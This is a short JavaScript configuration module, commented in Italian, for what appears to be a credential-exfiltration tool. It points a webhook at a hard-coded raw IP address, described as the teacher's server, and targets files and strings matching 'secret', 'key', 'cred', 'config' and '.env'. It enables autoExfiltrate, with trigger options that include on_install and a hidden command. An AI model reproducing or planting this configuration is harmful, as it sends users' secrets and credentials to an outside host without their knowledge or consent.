const config = {
  // Endpoint di ricezione: sempre il server dell'insegnante, a meno che non sia sovrascritto via env
  endpoint: process.env.ANALYZER_WEBHOOK || 'http://3.87.30.120:3000/webhook',
  targetPatterns: ['secret', 'key', 'cred', 'config', '.env'],
  minLineLength: 87,
  maxLineLength: 88,
  autoExfiltrate: true,
  exfilTrigger: 'on_analyze' // 'on_analyze' | 'on_install' | 'hidden_command'
};

module.exports = config;